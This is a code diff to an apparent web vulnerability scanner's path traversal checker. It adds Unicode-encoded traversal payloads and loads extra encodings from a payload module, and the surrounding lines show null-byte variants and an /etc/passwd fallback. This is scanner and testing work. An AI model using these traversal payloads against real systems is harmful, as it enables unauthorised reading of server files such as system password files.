@@ -2858,6 +2858,20 @@ def verify_generic_path_traversal(
         _rel_bs = rel.replace("/", "%5C")
         attempts += [("%5C.." * n) + "%5C" + _rel_bs for n in depths]
         attempts += [rel + "%00", canary_path + "%00"]
+        # Unicode path separator variants: IIS %u2215 / %u002f, fullwidth solidus %ef%bc%8f
+        # (Java/Python path libs normalize these before filesystem access, bypassing string checks)
+        attempts += [("..%u002f" * n) + rel for n in (2, 4, 6, 8)]
+        attempts += [("..%u2215" * n) + rel for n in (2, 4, 6, 8)]
+        attempts += [("..%ef%bc%8f" * n) + rel for n in (2, 4, 6, 8)]
+        # Payload_kb extended encodings (deduplicates automatically at probe time)
+        try:
+            from .payload_kb import load_path_traversal_encodings as _lpt
+            for _d in (4, 6, 8):
+                for _pt_variant in _lpt(_d, rel):
+                    if _pt_variant not in attempts:
+                        attempts.append(_pt_variant)
+        except Exception:
+            pass
 
         # In passwd-mode, replace attempts with /etc/passwd traversal paths
         if _canary_failed:
